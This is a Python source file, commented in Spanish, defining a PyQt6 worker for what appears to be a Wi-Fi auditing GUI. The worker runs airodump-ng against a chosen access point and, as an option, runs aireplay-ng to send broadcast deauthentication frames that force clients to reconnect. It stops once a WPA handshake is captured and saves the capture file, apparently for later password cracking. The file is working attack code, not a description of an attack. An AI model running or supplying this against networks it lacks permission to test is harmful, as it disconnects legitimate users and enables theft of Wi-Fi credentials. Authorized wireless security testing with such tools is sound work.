"""Worker de captura dirigida de handshakes WPA/WPA2."""

from __future__ import annotations

import re
import threading
import time
from pathlib import Path

from PyQt6.QtCore import QThread, pyqtSignal

from .constants import OUTPUT_DIR
from .parsers import parse_capture_line
from .process import PtyProcess


class CaptureWorker(QThread):
    """Lanza airodump-ng filtrado por BSSID y canal.

    - Opcionalmente envía paquetes deauth con aireplay-ng para forzar que un
      cliente se reconecte y se produzca el 4-way handshake.
    - Detecta la cadena "WPA handshake" en la salida y se detiene solo.
    - Publica cada segundo clientes, paquetes y tiempo transcurrido.
    """

    log = pyqtSignal(str)
    status = pyqtSignal(dict)
    handshake_found = pyqtSignal(str)
    finished_capture = pyqtSignal(str, str)  # ruta .cap, motivo
    error = pyqtSignal(str)

    def __init__(
        self,
        interface: str,
        bssid: str,
        channel: int,
        essid: str,
        deauth: bool = False,
        duration: int = 120,
        parent=None,
    ) -> None:
        super().__init__(parent)
        self.interface = interface
        self.bssid = bssid
        self.channel = int(channel)
        self.essid = essid
        self.deauth = deauth
        self.duration = max(10, int(duration))
        self._stop_event = threading.Event()
        self._process: PtyProcess | None = None
        self._clients: set[str] = set()
        self._packets = 0

    def request_stop(self) -> None:
        self._stop_event.set()

    def _run_deauth(self) -> None:
        """Envía 10 paquetes de deauth (broadcast) al AP objetivo."""
        cmd = [
            "aireplay-ng",
            "--deauth",
            "10",
            "-a",
            self.bssid,
            self.interface,
        ]
        self.log.emit("$ " + " ".join(cmd))
        try:
            process = PtyProcess(cmd)
        except FileNotFoundError:
            self.log.emit("aireplay-ng no está instalado; se omite el deauth.")
            return

        deadline = time.monotonic() + 30
        try:
            while process.proc.poll() is None:
                if self._stop_event.is_set() or time.monotonic() > deadline:
                    break
                for line in process.read_lines(0.2):
                    if line.strip():
                        self.log.emit(line)
        finally:
            process.stop()

    def _handle_line(self, line: str) -> str | None:
        """Procesa una línea y devuelve la MAC del handshake si aparece."""
        before = set(self._clients)
        packets, handshake_mac = parse_capture_line(
            line, self.bssid, self._clients
        )
        if packets is not None:
            self._packets = max(self._packets, packets)

        for mac in sorted(self._clients - before):
            self.log.emit(f"Cliente detectado: {mac}")

        text = line.strip()
        if text.startswith("BSSID") or "STATION" in text:
            # Cabeceras de airodump-ng: se muestran una sola vez.
            if text not in getattr(self, "_seen_headers", set()):
                if not hasattr(self, "_seen_headers"):
                    self._seen_headers = set()
                self._seen_headers.add(text)
                self.log.emit(text)

        return handshake_mac

    @staticmethod
    def _find_cap(prefix: Path) -> str:
        matches = sorted(
            prefix.parent.glob(f"{prefix.name}-*.cap"),
            key=lambda p: p.stat().st_mtime,
        )
        return str(matches[-1]) if matches else ""

    def run(self) -> None:
        reason = "stopped"
        handshake = False
        cap_path = ""
        process: PtyProcess | None = None
        started = time.monotonic()
        prefix = Path()

        try:
            OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
            safe_name = re.sub(r"[^A-Za-z0-9_-]+", "_", self.essid).strip("_")
            safe_name = safe_name[:40] or "captura"
            stamp = time.strftime("%Y%m%d_%H%M%S")
            prefix = OUTPUT_DIR / f"handshake_{safe_name}_{stamp}"

            cmd = [
                "airodump-ng",
                "--bssid",
                self.bssid,
                "--channel",
                str(self.channel),
                "--write",
                str(prefix),
                "--write-interval",
                "1",
                self.interface,
            ]
            self.log.emit("$ " + " ".join(cmd))
            process = PtyProcess(cmd)
            self._process = process

            deauth_sent = not self.deauth
            last_status = 0.0

            while True:
                elapsed = time.monotonic() - started

                if self._stop_event.is_set():
                    reason = "stopped"
                    break
                if elapsed >= self.duration:
                    reason = "timeout"
                    break

                # Esperamos 5 s para que airodump-ng esté escuchando antes
                # de enviar el deauth.
                if not deauth_sent and elapsed >= 5:
                    deauth_sent = True
                    self.log.emit(
                        "Enviando deauth para forzar la reconexión..."
                    )
                    self._run_deauth()
                    if self._stop_event.is_set():
                        reason = "stopped"
                        break

                for line in process.read_lines(0.15):
                    mac = self._handle_line(line)
                    if mac and not handshake:
                        handshake = True
                        self.log.emit(f"¡WPA handshake detectado! ({mac})")
                        self._stop_event.set()
                        reason = "handshake"
                        break
                if handshake:
                    break

                if process.proc.poll() is not None:
                    # airodump-ng terminó por su cuenta (error de interfaz...).
                    for line in process.read_lines(0.05):
                        mac = self._handle_line(line)
                        if mac and not handshake:
                            handshake = True
                            reason = "handshake"
                    if not handshake:
                        reason = "error"
                    break

                if time.monotonic() - last_status >= 1:
                    self.status.emit(
                        {
                            "clients": len(self._clients),
                            "packets": self._packets,
                            "elapsed": int(elapsed),
                            "handshake": handshake,
                            "running": True,
                        }
                    )
                    last_status = time.monotonic()

        except FileNotFoundError:
            reason = "error"
            self.error.emit(
                "airodump-ng no está instalado o no está en el PATH."
            )
        except Exception as exc:
            reason = "error"
            self.error.emit(f"Error durante la captura: {exc}")
        finally:
            if process is not None:
                process.stop()
            if prefix.name:
                cap_path = self._find_cap(prefix)

            self.status.emit(
                {
                    "clients": len(self._clients),
                    "packets": self._packets,
                    "elapsed": int(time.monotonic() - started),
                    "handshake": handshake,
                    "running": False,
                }
            )

            if handshake:
                if cap_path:
                    self.handshake_found.emit(cap_path)
                else:
                    self.error.emit(
                        "Se detectó el handshake pero no se encontró el "
                        "archivo .cap. Revisa la carpeta de capturas."
                    )

            self.finished_capture.emit(cap_path, reason)
